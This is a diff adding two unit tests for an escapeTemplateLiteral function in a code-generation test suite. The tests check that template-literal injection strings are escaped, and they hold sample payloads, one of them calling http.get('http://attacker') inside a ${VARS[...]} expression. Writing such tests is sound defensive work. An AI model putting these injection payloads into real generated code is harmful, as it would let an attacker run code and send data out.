@@ -901,6 +901,19 @@ describe('Code generation', () => {
     it('should handle backslash before backtick', () => {
       expect(escapeTemplateLiteral('hello\\`world')).toBe('hello\\\\`world')
     })
+
+    it('should escape VARS prefix followed by injected code', () => {
+      const payload = "${VARS['x']+(()=>{ http.get('http://attacker') })()}"
+      const escaped = escapeTemplateLiteral(payload)
+      expect(escaped).toContain('\\${')
+      expect(escaped).not.toMatch(/${VARS/)
+    })
+
+    it('should escape correlation_vars prefix followed by injected code', () => {
+      const payload = "${correlation_vars['x'] + malicious()}"
+      const escaped = escapeTemplateLiteral(payload)
+      expect(escaped).toContain('\\${')
+    })
   })
 
   describe('escapeSingleQuotedString', () => {
